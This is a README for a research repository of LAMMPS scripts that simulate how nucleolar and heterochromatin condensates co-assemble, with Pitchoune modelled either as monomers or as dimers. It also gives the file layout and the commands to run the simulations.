[Coarse-grained_model_of_nucleolar_heterochromatin_condensates-2.0.0.zip](https://github.com/user-attachments/files/20303025/Coarse-grained_model_of_nucleolar_heterochromatin_condensates-2.0.0.zip)

# Affinity Hierarchies and Amphiphilic Proteins Underlie the Co-Assembly of Nucleolar and Heterochromatin Condensates

## Table of Contents  
- [Overview](#overview)  
- [System Requirements](#system-requirements)  
- [File Description](#file-description)  
- [How to Run](#how-to-run)  

---

## Overview

This repository contains all input scripts and configuration files used to simulate the **co-assembly of nucleolar and heterochromatin condensates** using the molecular dynamics package [LAMMPS](https://www.lammps.org/).

The model represents **four nuclear components**:
- **PCH (Heterochromatin)** – as a long polymer chain
- **Ribosomal DNA (rDNA)** – as a long polymer chain
- **Fibrillarin (F)** – as independent monomers
- **Pitchoune (X)** – modeled as either:
  - Independent amphiphilic monomers (in `Pitchoune_as_independent_molecule`)
  - Dimers with head and tail (in `Pitchoune_as_dimer`)

The simulations explore how **molecular interactions and spatial confinement** drive the organization of these components within the nucleus.

---

## System Requirements

- **LAMMPS** (Large-scale Atomic/Molecular Massively Parallel Simulator)  
  - See the [official installation guide](https://docs.lammps.org/Install.html) for setup instructions.
  - MPI support is recommended for multi-core runs.

- **Platform compatibility:**  
  - Tested on **Ubuntu Linux**  
  - Should also work on **macOS** or **Windows** with proper C/C++ compilers and MPI setup

- **Visualization tool:**  
  - [OVITO](https://www.ovito.org/) (Open Visualization Tool) for rendering `.lammpstrj` trajectories

---

## File Description

### 📁 `Pitchoune_as_independent_molecule/`
Simulates Pitchoune as **independent monomers** (single-particle proteins)

- `system.data`  
  Initial configuration file with the polymer structure

- `system_initial.in`  
  Initial LAMMPS script to add Fibrillarin and Pitchoune molecules to the system

- `system.in`  
  Main LAMMPS script to run the simulation with all four components confined in a spherical region

---

### 📁 `Pitchoune_as_dimer/`
Simulates Pitchoune as a **dimer**, with distinct head and tail particles bonded during initialization

- `system.data`  
  Initial configuration file with the polymer structure

- `system_initial.in`  
  LAMMPS script to add Fibrillarin and Pit (head + tail) molecules, and create Pit dimers via bonding

- `system.in`  
  Main simulation script with detailed pairwise interactions, confinement, and observable tracking (e.g., cluster size, COM distance, R<sub>g</sub>)

---

## How to Run

1. **Install LAMMPS** by following the [installation instructions](https://docs.lammps.org/Install.html)

2. **Run the simulations** (ensure that `system.data` is present in the same folder as the scripts):

```bash
# Run the initial configuration step
./lmp_mpi -in system_initial.in > output_initial.out

# Run the final simulation (multi-core)
mpirun -np 4 ./lmp_mpi -in system.in > output_final.out
